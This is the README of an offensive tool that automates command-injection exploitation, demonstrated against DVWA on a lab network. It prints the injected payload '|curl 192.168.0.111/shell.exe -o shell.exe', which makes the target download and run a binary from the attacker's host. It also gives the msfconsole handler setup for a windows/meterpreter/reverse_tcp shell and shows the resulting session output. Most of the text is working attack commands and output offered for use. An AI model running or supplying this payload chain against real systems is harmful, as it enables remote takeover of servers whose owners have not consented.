# Command Injection Tool

This tool can be utilised when attacker has found a field with command injection possible.  It will automate the process and will provide you with a meterpreter shell.

- You'll need a **webserver** running at **port 80** in same directory as script. (tool will prompt you).
- You'll need **msfvenom** and **msfconsole** installed.

### Usage

```
./command_injection.py -u http://192.168.0.104/dvwa/vulnerabilities/exec/ -c "PHPSESSID:ggc66turb492nrus71o8u34a20;security:high;" -t "ip" -p "Submit:Submit;" -m post --LHOST 192.168.0.111 --LPORT 4444


usage: command_inejction.py [-h] [-p PARAM] [-t TARGET] [-u URL] [-c COOKIES]
                            [-m METHOD] [-lh LHOST] [-lp LPORT]

optional arguments:
  -h, --help            show this help message and exit
  -p PARAM, --param PARAM
                        Param: -p Submit:Submit;Login:Login;
  -t TARGET, --target TARGET
                        Target Param: -t ip
  -u URL, --url URL     URL: -u http://127.0.0.1/
  -c COOKIES, --cookies COOKIES
                        Cookies: -c PHPSESSID:f8ucrbu0qmta4ettc3208gcvnq&
                        security:low
  -m METHOD, --method METHOD
                        Method: -m get OR -m POST
  -lh LHOST, --LHOST LHOST
                        LHOST: -lh 192.168.0.112
  -lp LPORT, --LPORT LPORT
                        LPORT: -lp 8080
```

### Step 1
- Run the program.
```
./command_injection.py -u http://192.168.0.104/dvwa/vulnerabilities/exec/ -c "PHPSESSID:ggc66turb492nrus71o8u34a20;security:high;" -t "ip" -p "Submit:Submit;" -m post --LHOST 192.168.0.111 --LPORT 4444
```
- Output
```
[+] You'll need to host a web server at 192.168.0.111:4444 at path /home/baba/GitHub/ethical-hacking-scripts/BugBountyHunter/Automation/command_injection.
[...] sudo python3 -m http.server 80
[*] Hit enter once done... 
```
### Step 2
- Start a web server in same directory as command_injection.py.
```
sudo python3 -m http.server 80
```
- Hit Enter

```
[*]URL : http://192.168.0.104/dvwa/vulnerabilities/exec/
[*]Cookies {'PHPSESSID': 'ggc66turb492nrus71o8u34a20', 'security': 'high'}
[*]Param: Submit:Submit;ip
[*]Payload: |curl 192.168.0.111/shell.exe -o shell.exe
[+] You'll need to start a handler at LHOST:192.168.0.111, LPORT:4444 in msfconsole. 
        Set Payload to windows/meterpreter/reverse_tcp. Set RHOST to 
[*] Hit enter once done... 
```
### Step 3
- Start metasplpoit and multi/handler.
```
msfconsole

msf6 > use multi/handler  
[*] Using configured payload generic/shell_reverse_tcp

msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp  
payload => windows/meterpreter/reverse_tcp  
msf6 exploit(multi/handler) > set LHOST 192.168.0.111
LHOST => 192.168.0.111

msf6 exploit(multi/handler) > run  
  
[*] Started reverse TCP handler on 192.168.0.111:4444

```
- Hit Enter
```
[*]URL : http://192.168.0.104/dvwa/vulnerabilities/exec/
[*]Cookies {'PHPSESSID': 'ggc66turb492nrus71o8u34a20', 'security': 'high'}
[*]Param: Submit:Submit;ip
[*]Payload: |shell.exe
```
- We have shell
```
[*] Sending stage (175174 bytes) to 192.168.0.104  
[*] Meterpreter session 1 opened (192.168.0.111:4444 -> 192.168.0.104:50322) at 2021-01-18 20:04:17 +0530  
  
meterpreter > 
```

- Finally, when you exit or close the session. It will remove all the files created for it to work.

```
[-] Cleaning up...
[*]URL : http://192.168.0.104/dvwa/vulnerabilities/exec/
[*]Cookies {'PHPSESSID': 'ggc66turb492nrus71o8u34a20', 'security': 'high'}
[*]Param: Submit:Submit;ip
[*]Payload: |del shell.exe

```
